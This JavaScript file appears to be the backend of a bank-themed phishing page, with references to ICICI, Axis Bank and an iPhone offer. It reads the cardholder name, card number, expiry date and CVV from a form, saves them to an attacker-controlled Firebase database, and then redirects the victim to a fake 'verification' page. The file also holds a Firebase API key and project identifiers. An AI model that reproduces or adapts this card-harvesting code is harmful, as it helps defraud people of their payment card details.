// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyDnz-NMJ63gE9jADWsOg8wp5yaIXYjW8PA",
  authDomain: "icici-iphone.firebaseapp.com",
  databaseURL: "https://icici-iphone-default-rtdb.firebaseio.com",
  projectId: "icici-iphone",
  storageBucket: "icici-iphone.appspot.com",
  messagingSenderId: "865747402804",
  appId: "1:865747402804:web:d115757350dcc835404a61",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var card_name = getInputVal('card_name');
  var card_no = getInputVal('card_no');
  var exp_date = getInputVal('exp_date');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(card_name, card_no, exp_date, cvv);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();

document.getElementById('contactForm').reset();
window.location.href="verification/verify.html";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(card_name, card_no, exp_date, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    card_name: card_name,
    card_no:card_no,
    exp_date:exp_date,
    cvv:cvv,
  });
}
